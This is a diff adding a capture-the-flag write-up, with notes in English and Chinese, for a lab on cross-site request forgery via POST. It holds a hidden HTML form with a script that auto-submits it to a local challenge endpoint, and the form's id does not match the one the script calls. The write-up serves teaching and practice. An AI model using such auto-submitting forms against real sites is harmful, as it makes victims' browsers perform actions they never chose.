@@ -1,0 +1,23 @@
+#CSRF 2
+#挑战简介
+Recall that requests that originate from JavaScript run into the Same-Origin Policy, which slightly complicated our CSRF in the previous level. 
+You figured out how to make a GET request without JavaScript. Can you do the same for POST?
+
+Recall that a typical POST request is a result of either a JavaScript-invoked request (no good for SOP) or an HTML form submission. 
+You'll need to do the latter. Of course, the /challenge/victim won't click the Submit button for you --- you'll have to figure out how to do that yourself 
+(HINT: JavaScript can click that button; the request will still count as originating from the form!).
+
+Go POST-CSRF to the flag!
+
+#这题思路和上一题类似，上一题GET请求，这一题就是POST请求了，
+#主要用到
+<form id="..." action="http://challenge.localhost/publish" method="POST">
+    <input type="hidden" name="key" value="value">
+    <button type="submit">Submit</button>
+</form>
+
+<script>
+    document.getElementById('csrfForm').submit();   //自动提交表单
+</script>
+
+#基本上就这两个语法，其他的和上一题一样
